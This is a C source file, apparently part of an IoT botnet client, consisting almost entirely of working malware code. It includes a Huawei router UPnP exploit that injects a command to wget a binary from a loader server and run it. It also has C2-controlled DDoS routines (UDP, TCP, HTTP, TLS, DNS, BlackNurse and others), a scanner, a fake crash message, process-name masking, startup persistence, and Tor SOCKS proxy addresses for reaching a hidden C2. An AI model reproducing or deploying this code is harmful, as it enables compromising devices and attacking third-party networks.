                        sockprintf(conn->fd, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 440\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox rm -f /tmp/*; /bin/busybox wget http://%s/mips -O /tmp/mip; /bin/busybox chmod 777 /tmp/mip; /tmp/mip)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n\r\n", ldserver);
                        close(conn->fd);
                        Kvjei9ffj83j_setup_connection(conn);
                        conn->state = Kvjei9ffj83j_SC_EXPLOIT_STAGE3;
                        continue;
                    }
                    else if(conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE3)
                    {
                        #ifdef DEBUG
                            printf("[Kvjei9ff] FD%d finnished\n", conn->fd);
                        #endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = Kvjei9ffj83j_SC_CLOSED;
                        continue;
                    }
                    else
                    {
                        #ifdef DEBUG
                            printf("[Kvjei9ff] FD%d connected to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        #endif
                        conn->state = Kvjei9ffj83j_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = Kvjei9ffj83j_SC_CLOSED;
                    continue;
                }
            }
            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(1)
                {
                    int ret = 0;
                    if(conn->state == Kvjei9ffj83j_SC_CLOSED)
                        break;
                    if(conn->rdbuf_pos == Kvjei9ffj83j_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + Kvjei9ffj83j_SCANNER_HACK_DRAIN, Kvjei9ffj83j_SCANNER_RDBUF_SIZE - Kvjei9ffj83j_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= Kvjei9ffj83j_SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = Kvjei9ffj83j_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, Kvjei9ffj83j_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == Kvjei9ffj83j_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                Kvjei9ffj83j_setup_connection(conn);
                                continue;
                            }
                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = Kvjei9ffj83j_SC_CLOSED;
                            memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = Kvjei9ffj83j__aa;
                    int len = strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}
#endif
void j83jdt(int sock) {
    uint32_t parent;
    parent = fork();
    int forks = sysconf(_SC_NPROCESSORS_ONLN); //2 j83j fork for each CPU core.
    if (parent > 0) {
        j83jPid = parent;
    } else if (parent == -1) return;
	int fds = 128;
    int get;

    srand(time(NULL) ^ getpid() * forks);
    if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
        kh74letnac(1000, fds, sock);
    }else{
#ifdef Kvjei9ffj83j
        Kvjei9ff_init();
#endif
        j83j_xywz(sock);
    }
#ifdef ENEMY
    sshj83j();
#endif
}


void processCmd(int argc, unsigned char * argv[]) {
  if(strstr(argv[0], decode("~-6mvgmv"))) { //LDSERVER - gets loader server for everything
      if(argc == 2) { memset(ldserver, 0, sizeof(ldserver)); strcpy(ldserver, argv[1]); }
    // printf("SUCCESSFULLY LOADED LOADER SERVER %s\n", ldserver);
  }
  if (!strcmp(argv[0], decode("1-|"))) {
    if (argc < 4 || atoi(argv[2]) <= 0 || atoi(argv[3]) <= 0 ) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = (argc > 4 ? atoi(argv[4]) : 32);
    int packetsize = (argc > 5 ? atoi(argv[5]) : 65507);;
    int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
    int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
    int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
        _exit(0);
      }
    }
    return;
  }

  if (!strcmp(argv[0], decode("cD|"))) { //TCP
    if (argc < 5 || atoi(argv[3]) <= 0 || atoi(argv[2]) == -1) {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = 32;
    unsigned char *flags = argv[4];

    int pollinterval = 10;
    int psize = atoi(argv[5]);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          ftcp(hi, port, time, spoofed, flags, psize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        ftcp(ip, port, time, spoofed, flags, psize, pollinterval);
        _exit(0);
      }
    }
	return;
  }
      if (!strcmp(argv[0], decode("ecc|"))) { //HTTP
        if (argc < 6) {
            return;
        }
        if (strstr((const char * ) argv[1], ",") != NULL) {
            unsigned char * hi = (unsigned char * ) strtok((char * ) argv[1], ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
                    _exit(0);
                }
                hi = (unsigned char * ) strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
            sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
            _exit(0);
			}
        }
    }

  
    if (!strcmp(argv[0], decode("ej~-"))) { //HOLD
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHLD(hi, port, time);
                    close(fd_cnc);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {

            sendHLD(ip, port, time);
            _exit(0);
			}
        }
    }
    if (!strcmp(argv[0], decode("51,U"))) { //JUNK
        if (argc < 3 || atoi(argv[3]) < 0) {
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if(!listFork())
                    sendJNK(hi, port, time);
					_exit(0);
			}
			hi = strtok(NULL, ",");
         
        } else {
            if (!listFork()) {

            sendJNK(ip, port, time);
			_exit(0);
        }
    }
	}
		
    if (!strcmp(argv[0], decode("c~6"))) { //TLS ATTACK CODED BY FREAK
        if (argc < 3 || atoi(argv[3]) < 0) {
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if(!listFork())
                    sendTLS(hi, port, time);
					_exit(0);
			}
			hi = strtok(NULL, ",");
         
        } else {
            if (!listFork()) {

            sendTLS(ip, port, time);
			_exit(0);
        }
    }
	}
		
  if (!strcmp(argv[0], decode("6c-"))) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
				if(!listFork()) {
                sendPkt(hi, port, time);
				_exit(0);
				}
                hi = strtok(NULL, ",");
            }
    } else {
if(!listFork()) {
                sendPkt(ip, port, time);
				_exit(0);
				}
				}
	return;
  }
  
  if (!strcmp(argv[0], decode("-,6"))) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
				if(!listFork()) {
                DNSw(hi, port, time);
				_exit(0);
				}
                hi = strtok(NULL, ",");
            }
    } else {
if(!listFork()) {
                DNSw(ip, port, time);
				_exit(0);
				}
				}
	return;
  }
  
    if (!strcmp(argv[0], decode("6D7,,mv"))) { //SCANNER
        if (!strcmp(argv[1], decode("j,"))) { //ON
        if (j83jPid == 0) {
            j83jdt(fd_cnc);
            if (j83jPid != 0) {
                return;
            } else {
                return;
            }
        } else {
            return;
        }
    }
    if (!strcmp(argv[1], decode("jdd"))) { //OFF
        if (j83jPid != 0) {
            if (kill(j83jPid, 9) == 0) {
                j83jPid = 0;
                return;
            } else {
                return;
            }
        } else {
            return;
        }
    } else {
        return;
    }
    }
	if(!strcmp(argv[0], decode("jge"))) { //OVH
		if(argc < 5)
                {
                        
                        return;
                }
				if(!listFork()) {
		pktSend(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
	
		}
	}
	if(!strcmp(argv[0], decode(".~7DU,1v6m"))) { //BLACKNURSE
		if (argc < 2) {
			return;
		}
		if(!listFork()) {
			bnrse(argv[1], atoi(argv[2]));
		}
	}

        if(!strcmp(argv[0], decode("6cj|")))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					//
                } else {
							//
					   }
        }

}
 

#define TOR_MAX_SOCKS   24
struct sock_value {
    uint32_t ip_val;
    uint16_t port_val;
};


#define CNC_PORT        54666


#define STAGE_SETUP     0 // setup non-blocking connection
#define STAGE_VERIFY    1 // verify if the connection is alive
#define STAGE_TORSOCK   2 // complete connection passover to sock5
#define STAGE_MAINLOOP  3 // main loop with the cnc

#define TOR_AUTH        0 // authenticate to the sock5
#define TOR_HANDOVER    1 // handover the connection to the dest onion/domain
#define TOR_VERIFY      2 // verify if the sock5 has handed over the connection

#define CONN_ESTABLISHED 3 // established connection to cnc
static fd_set rdset, wrset;

static int stage = STAGE_SETUP, state = TOR_AUTH;

struct sock_value socks[TOR_MAX_SOCKS];

uint32_t retrieve_addr(int id)
{
    if (socks[id].ip_val > 0)
        return socks[id].ip_val;
}

uint16_t retrieve_port(int id)
{
    if (socks[id].port_val  > 0)
        return socks[id].port_val;
}

void add_sock(int id, uint32_t ip_val, uint16_t port_val)
{
    socks[id].ip_val = ip_val;
    socks[id].port_val = port_val;
}

void socks_xywz(void)
{
add_sock(0, INET_ADDR(192,248,190,123), HTONS(8009));
add_sock(1, INET_ADDR(88,198,82,11), HTONS(9051));
add_sock(2, INET_ADDR(188,166,34,137), HTONS(9000));
add_sock(3, INET_ADDR(185,142,234,33), HTONS(8090));
add_sock(4, INET_ADDR(88,99,36,14), HTONS(9988));
add_sock(5, INET_ADDR(185,117,154,207), HTONS(80));
add_sock(6, INET_ADDR(176,9,254,194), HTONS(9050));
add_sock(7, INET_ADDR(192,248,190,123), HTONS(8008));
add_sock(8, INET_ADDR(167,71,41,63), HTONS(9050));
add_sock(9, INET_ADDR(66,49,207,24), HTONS(9050));
add_sock(10, INET_ADDR(84,38,181,111), HTONS(9050));
add_sock(11, INET_ADDR(45,149,76,42), HTONS(9051));
add_sock(12, INET_ADDR(65,21,49,222), HTONS(9295));
add_sock(13, INET_ADDR(46,50,168,131), HTONS(8118));
add_sock(14, INET_ADDR(3,92,232,117), HTONS(9050));
add_sock(15, INET_ADDR(95,217,132,133), HTONS(3128));
add_sock(16, INET_ADDR(95,217,132,133), HTONS(3406));
add_sock(17, INET_ADDR(95,217,132,133), HTONS(3000));
add_sock(18, INET_ADDR(95,217,132,133), HTONS(3048));
add_sock(19, INET_ADDR(95,217,132,133), HTONS(3541));
add_sock(20, INET_ADDR(95,217,132,133), HTONS(3443));
add_sock(21, INET_ADDR(185,36,132,223), HTONS(9050));
add_sock(22, INET_ADDR(138,201,172,111), HTONS(9988));
add_sock(23, INET_ADDR(147,135,114,49), HTONS(9160));
}

void main_cleanup_connection(void)
{
    if (fd_cnc != -1)
    {
        close(fd_cnc);
        fd_cnc = -1;
    }

    stage = STAGE_SETUP;
    state = TOR_AUTH;
    sleep(rand() % 4);
}

char *getBuild() { //Get current architecture, detectx nearly every architecture. Coded by Freak
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7A";
    #elif defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7R";
    #elif defined(__ARM_ARCH_7M__)
    return "ARM7M";
    #elif defined(__ARM_ARCH_7S__)
    return "ARM7S";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__PPC__) || defined(_ARCH_PPC)
    return "POWERPC";
    #elif defined(__PPC64__) || defined(__ppc64__) || defined(_ARCH_PPC64)
    return "POWERPC64";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}

/* returns
 *   -1 on errors
 *    0 on successful server bindings
 *   1 on successful client connects
 */
int singleton_connect(const char *name) {
    int len, tmpd;
    struct sockaddr_un addr = {0};

    if ((tmpd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) {
        return -1;
    }

    /* fill in socket address structure */
    addr.sun_family = AF_UNIX;
    strcpy(addr.sun_path, name);
    len = offsetof(struct sockaddr_un, sun_path) + strlen(name);

    int ret;
    unsigned int retries = 1;
    do {
        /* bind the name to the descriptor */
        ret = bind(tmpd, (struct sockaddr *)&addr, len);
        /* if this succeeds there was no daemon before */
        if (ret == 0) {
            return 0;
        } else {
            if (errno == EADDRINUSE) {
                ret = connect(tmpd, (struct sockaddr *) &addr, sizeof(struct sockaddr_un));
                if (ret != 0) {
                    if (errno == ECONNREFUSED) {
                        unlink(name);
                        continue;
                    }
                    continue;
                }
                return 1;
            }
            continue;
        }
    } while (retries-- > 0);

    close(tmpd);
    return -1;
}
int main(int argc, char**argv) {
        fprintf(stderr, "perror: EWOULDBLOCK\nSegmentation fault (core dumped)\n");
        if(singleton_connect("telnetd.lock") != 0) exit(1); // rrrrrrrreeeeeeeeeee ....
        srand(time(NULL) ^ getpid() ^ getppid());
        init_rand(time(NULL) ^ getpid() ^ getppid());
        char pname[13];
        rand_str(pname, 12);
        int asds;
        // calculate available size
        size_t space = 0;
        for (asds = 0; asds < argc; asds++) {
            size_t length = strlen(argv[asds]);
            space += length + 1; // because of terminating zero 
        }
        memset(argv[0], '\0', space); // wipe existing args
        strncpy(argv[0], pname, space - 1); // -1: leave null termination, if title bigger than space
        pid_t pid1;
        pid_t pid2;
        int status;
        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        }
		setuid(0);				
		seteuid(0);
        signal(SIGCHLD, SIG_IGN); //AUTOMATICALLY REAP CHILD PROCESSES
        signal(SIGPIPE, SIG_IGN);
#ifdef STARTUP
			char cwd[256];
			FILE *file;
			char str[16];
            sprintf(str, "/etc/%s", decode("=ru_Brf_"));
			file=fopen(str,"r");
			if (file == NULL) {
				file=fopen(str,"r");
			}
			if (file != NULL) {
					char outfile[256], buf[1024];
					int i=strlen(argv[0]), d=0;
					getcwd(cwd,256);
					if (strcmp(cwd,"/")) {
							while(argv[0][i] != '/') i--;
							sprintf(outfile,"%s%s\n",cwd,argv[0]+i);
							while(!feof(file)) {
									fgets(buf,1024,file);
									if (!strcasecmp(buf,outfile)) d++;
							}
							if (d == 0) {
									FILE *out;
									fclose(file);
									out=fopen(str,"a");
									if (out != NULL) {
											fputs(outfile,out);
											fclose(out);
									}
							}
							else fclose(file);
					}
					else fclose(file);
			}
#endif
    killer_xywz(getpid());
    socks_xywz();
    char sendbuf[256], rdbuf[1024], string[128];
    int got = 0;
    int i = 0;
    int read_set = 0;
    struct timeval tv;
    int node = 0;
    while(1){
        if (stage == STAGE_SETUP)
        {
            // connect to host and make it non blocking
            struct sockaddr_in s_addr;
            node = rand() % TOR_MAX_SOCKS;
            memset(&s_addr, 0, sizeof(s_addr));
            s_addr.sin_family = AF_INET;
            s_addr.sin_addr.s_addr = retrieve_addr(node);
            s_addr.sin_port = retrieve_port(node);


            if (fd_cnc != -1)
            {
                close(fd_cnc);
                fd_cnc = -1;
            }

            if ((fd_cnc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            {
#ifdef DEBUG
                printf("[main] failed to call socket(), exiting\n");
#endif
                return 0;
            }

            fcntl(fd_cnc, F_SETFL, fcntl(fd_cnc, F_GETFL, 0) | O_NONBLOCK);
            connect(fd_cnc, (struct sockaddr *)&s_addr, sizeof(s_addr));
#ifndef IPV4
            stage = STAGE_VERIFY;
#else
            stage = STAGE_MAINLOOP;
#endif
            continue;
        }
        else if (stage == STAGE_VERIFY)
        {
            int ret;

            FD_ZERO(&rdset);
            FD_ZERO(&wrset);
            FD_CLR(fd_cnc, &wrset);
            FD_CLR(fd_cnc, &rdset);
            FD_SET(fd_cnc, &wrset);

            tv.tv_sec = 10;
            tv.tv_usec = 0;

            ret = select(fd_cnc + 1, NULL, &wrset, NULL, &tv);
            if (ret < 0)
            {
#ifdef DEBUG
                printf("[main] failed to connect to cnc (timeout), retrying\n");
#endif
                main_cleanup_connection();
                continue;
            }

            if (FD_ISSET(fd_cnc, &wrset))
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] failed to connect to cnc (socket error), retrying\n");
#endif
                    main_cleanup_connection();
                    continue;
                }

#ifdef DEBUG
                printf("[main] connection established to tor sock5, attempting authentication\n");
#endif
                memcpy(sendbuf, "\x05\x01\x00", 3);
                send(fd_cnc, sendbuf, 3, MSG_NOSIGNAL);
                memset(sendbuf, 0, sizeof(sendbuf));
                stage = STAGE_TORSOCK;
                continue;
            }
            else
            {
#ifdef DEBUG
                printf("[main] failed to connect to cnc (cant write), retrying\n");
#endif
                main_cleanup_connection();
                continue;
            }
        }
        else if (stage == STAGE_TORSOCK)
        {
            int complete = 0;

            while (1)
            {
                int ret;

                FD_ZERO(&rdset);
                FD_ZERO(&wrset);
                FD_CLR(fd_cnc, &wrset);
                FD_CLR(fd_cnc, &rdset);

                if (state == TOR_AUTH || state == TOR_VERIFY)
                    FD_SET(fd_cnc, &rdset);
                else if (state == TOR_HANDOVER)
                    FD_SET(fd_cnc, &wrset);
                else
                {
                    complete = 0;
                    break;
                }

                tv.tv_sec = 10;
                tv.tv_usec = 0;

                ret = select(fd_cnc + 1, &rdset, &wrset, NULL, &tv);
                if (ret < 0)
                {
                    complete = 0;
                    break;
                }

                if (FD_ISSET(fd_cnc, &wrset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                    if (err != 0)
                    {
                        complete = 0;
                        break;
                    }

                    if (state == TOR_HANDOVER)
                    {
#ifdef DEBUG
                        printf("[main] sending tor sock5 handover, verifying connection\n");
#endif
    
                        memcpy(string, decode("CHANGEMEENCODED"), 23); //make sure length is correct. default length 22 is for standard short onions
                        char len = (char)22;
                        short port = HTONS(CNC_PORT);

                        memcpy(sendbuf, "\x05\x01\x00\x03", 4);
                        memcpy(sendbuf + 4, &len, 1);
                        memcpy(sendbuf + 5, string, len);
                        memcpy(sendbuf + 5 + len, &port, 2);

                        send(fd_cnc, sendbuf, 7 + len, MSG_NOSIGNAL);
                        memset(string, 0, sizeof(string));
                        memset(sendbuf, 0, sizeof(sendbuf));
                        state = TOR_VERIFY;
                        continue;
                    }
                    else
                    {
                        complete = 0;
                        break;
                    }
                }
                else if (FD_ISSET(fd_cnc, &rdset))
                {
                    int err = 0;
                    socklen_t err_len = sizeof(err);

                    getsockopt(fd_cnc, SOL_SOCKET, SO_ERROR, (void * )(&err), &err_len);
                    if (err != 0)
                    {
                        complete = 0;
                        break;
                    }

                    if (state == TOR_AUTH)
                    {
                        recv(fd_cnc, rdbuf, 2, MSG_NOSIGNAL);

                        if (rdbuf[1] != 0x00)
                        {
                            memset(rdbuf, 0, sizeof(rdbuf));
                            complete = 0;
                            break;
                        }
#ifdef DEBUG
                        printf("[main] tor sock5 authentication complete\n");
#endif
                        memset(rdbuf, 0, sizeof(rdbuf));
                        state = TOR_HANDOVER;
                        continue;
                    }
                    else if (state == TOR_VERIFY)
                    {
                        recv(fd_cnc, rdbuf, 10, MSG_NOSIGNAL);

                        if (rdbuf[1] != 0x00)
                        {
                            memset(rdbuf, 0, sizeof(rdbuf));
                            complete = 0;
                            break;
                        }

                        memset(rdbuf, 0, sizeof(rdbuf));
                        complete = 1;
                        break;
                    }
                    else
                    {
                        complete = 0;
                        break;
                    }
                }
            }

            if (complete == 0)
            {
#ifdef DEBUG
                printf("[main] failed to complete handover with tor sock5\n");
#endif
                main_cleanup_connection();
                continue;
            }
            else
            {
#ifdef DEBUG
                printf("[main] connection verified tor sock5 has been setup\n");
#endif
                sockprintf(fd_cnc, "%s %s\n", decode("f=rb"), getBuild()); //decoded is "arch"
                state = TOR_AUTH;
                stage = STAGE_MAINLOOP;
                continue;
            }
        } else if(stage == STAGE_MAINLOOP) {        
                while((got = got = recvLine(rdbuf, 1024)) != -1)
                {
                    if(got == 0) continue;
                  //  // fprintf(stderr, "%s : %s\n", print_hex_memory(rdbuf), rdbuf);
                    for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                            unsigned int *newpids, on;
                            for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                            pids[on - 1] = 0;
                            numpids--;
                            newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                            for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                            pids = newpids;
                            free(newpids);
                    }
                    rdbuf[got] = 0x00;
                    trim(rdbuf);
                    if(strstr(rdbuf, decode("|x,<")) == rdbuf)
                    {
                        continue;
                    }
                    unsigned char *message = rdbuf;
                    while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
                    unsigned char *command = message;
                    while(*message != ' ' && *message != 0x00) message++;
                    *message = 0x00;
                    message++;
                    unsigned char *tmpcommand = command;
                    while(*tmpcommand) { *tmpcommand = mytoupper(*tmpcommand); tmpcommand++; }
                    unsigned char *params[10];
                    int paramsCount = 1;
                    unsigned char *pch = strtok(message, " ");
                    params[0] = command;
                    while(pch) {
                            if(*pch != '\n') {
                                    if(paramsCount>=10) continue;
                                    params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                    memset(params[paramsCount], 0, strlen(pch) + 1);
                                    strcpy(params[paramsCount], pch);
                                    paramsCount++;
                            }
                            pch = strtok(NULL, " ");
                    }
                    processCmd(paramsCount, params);
                    if(paramsCount > 1) {
                            int q = 1;
                            for(q = 1; q < paramsCount; q++) {
                                    free(params[q]);
                            }
                    }
                }
                main_cleanup_connection();
           
            }
        }
}

